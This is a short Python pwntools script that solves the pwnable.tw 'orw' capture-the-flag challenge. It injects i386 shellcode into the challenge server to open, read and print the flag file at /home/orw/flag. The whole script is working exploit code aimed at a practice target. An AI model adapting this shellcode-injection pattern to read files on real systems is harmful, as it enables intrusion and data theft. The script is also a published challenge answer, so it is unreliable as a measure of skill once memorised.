#! /usr/bin/python

from pwn import *

context.arch = 'i386'

HOST = "chall.pwnable.tw"
PORT = 10001

flag = '/home/orw/flag'

sock = remote(HOST, PORT)
sock.recvuntil('Give my your shellcode:')

shellcode = ''
shellcode += shellcraft.open(flag)
shellcode += shellcraft.read('eax', 'esp', 64)
shellcode += shellcraft.write(1, 'esp', 64)
shellcode += shellcraft.exit(0)

sock.sendline(asm(shellcode))
print sock.recv()

sock.close()
